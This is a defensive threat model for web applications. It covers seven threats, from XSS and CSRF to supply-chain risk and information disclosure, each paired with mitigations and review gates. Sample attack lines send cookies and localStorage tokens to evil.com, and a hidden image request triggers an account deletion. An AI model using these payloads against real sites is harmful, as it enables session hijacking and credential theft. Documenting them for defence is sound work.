# Web Security — Threat Model

## Threat Surface

Web applications run code in untrusted browser environments and accept input from untrusted users. Primary attack vectors:

1. **XSS (Cross-Site Scripting)** — injecting scripts via user-controlled content
2. **CSRF (Cross-Site Request Forgery)** — tricking users into making authenticated requests
3. **Secrets in client bundle** — API keys embedded in JS served to browsers
4. **Insecure auth token storage** — tokens in localStorage accessible to XSS
5. **Clickjacking** — embedding the site in a malicious iframe
6. **Supply chain** — malicious npm packages or CDN-hosted scripts
7. **Information disclosure** — error messages exposing internals, source maps in production

---

## Threat 1: Cross-Site Scripting (XSS)

**Description:** Attacker injects malicious script via user-controlled content that gets rendered as HTML.

**Attack scenarios:**
```html
<!-- Stored XSS: attacker saves this as a comment -->
<script>document.location='https://evil.com?c='+document.cookie</script>

<!-- DOM XSS: URL parameter rendered directly -->
const name = new URLSearchParams(location.search).get('name')
element.innerHTML = name  // VULNERABLE
```

**Mitigations:**
- Never use `dangerouslySetInnerHTML` (React) or `v-html` (Vue) without DOMPurify sanitization
- Use `textContent` / `innerText` for user-controlled text — never `innerHTML`
- CSP header with restrictive `script-src` as defense in depth
- `httpOnly` cookies for auth tokens — XSS cannot steal what JS cannot read

**Verification gate:** Code review check for `dangerouslySetInnerHTML`, `v-html`, `innerHTML` with variable content. Static analysis rule.

---

## Threat 2: CSRF (Cross-Site Request Forgery)

**Description:** Malicious site tricks authenticated user's browser into making a state-mutating request.

**Attack scenario:**
```html
<!-- On evil.com — submits silently with user's session cookie -->
<img src="https://app.example.com/api/delete-account?confirm=true">
```

**Mitigations:**
- `SameSite=Strict` on session cookies (preferred — no token needed)
- OR: CSRF token in request header (double-submit cookie pattern)
- `SameSite=Lax` is insufficient for cross-origin POST — use Strict or explicit token

**Does not apply to:** Public endpoints with no state mutation. Cookie-less auth (Bearer tokens in Authorization header are CSRF-safe by nature).

**Verification gate:** Every cookie-authenticated state-mutating endpoint checked for CSRF protection.

---

## Threat 3: Secrets in Client Bundle

**Description:** API keys, database URLs, private tokens embedded in JS bundle served to browsers.

**Attack scenario:**
```typescript
// Accidentally included in client bundle
const client = new APIClient({ apiKey: process.env.PRIVATE_API_KEY })
```

**Mitigations:**
- Framework env var naming conventions enforced: `NEXT_PUBLIC_` / `VITE_` prefix required for client vars
- `PRIVATE_KEY`, `SECRET_`, `DATABASE_URL` — never referenced in client-side code
- Bundle inspection in CI: search bundle output for known secret patterns

**Verification gate:** Gate 7 — scan built bundle for secret patterns before deploy.

---

## Threat 4: Insecure Auth Token Storage

**Description:** Session tokens or JWTs stored in localStorage are accessible to any JavaScript, including injected XSS payloads.

**Attack scenario:**
```javascript
// XSS payload steals token from localStorage
fetch('https://evil.com/steal?token=' + localStorage.getItem('auth_token'))
```

**Mitigations:**
- Auth tokens in `httpOnly` cookies only — JavaScript cannot read httpOnly cookies
- If JWT must be JS-accessible: store in memory only (not localStorage/sessionStorage), accept that page refresh requires re-auth
- `Secure` attribute on all auth cookies (HTTPS only)

**Verification gate:** Code review confirms no auth tokens in localStorage/sessionStorage.

---

## Threat 5: Clickjacking

**Description:** Site embedded in a transparent iframe on a malicious page. User clicks appear to target the malicious overlay but actually click elements on the embedded site.

**Mitigation:**
- `X-Frame-Options: DENY` response header (or `SAMEORIGIN` if self-framing needed)
- OR: `Content-Security-Policy: frame-ancestors 'none'` (CSP supersedes X-Frame-Options in modern browsers)

**Verification gate:** Gate 1 — security headers check includes frame-ancestors.

---

## Threat 6: Supply Chain (npm / CDN scripts)

**Description:** Malicious code injected via compromised npm package or externally hosted CDN script.

**Mitigations:**
- `npm audit` in CI — block on high/critical findings
- Externally hosted scripts: Subresource Integrity (SRI) hash required
- No CDN scripts without `integrity` attribute in production HTML
- Minimize dependencies — each package is an attack surface

**Verification gate:** SRI hashes verified for all external scripts. `npm audit` zero high/critical.

---

## Threat 7: Information Disclosure

**Description:** Error messages, stack traces, or source maps expose internal implementation details.

**Mitigations:**
- Production error pages: generic message only, no stack traces
- Source maps: not served publicly — upload to error tracker (Sentry), block from CDN
- API errors: user-readable message only, no internal error codes or database details
- `X-Powered-By` header: remove (reveals framework version)

**Verification gate:** 500 error response checked — no stack trace in body. Source maps not accessible at `/assets/*.map`.
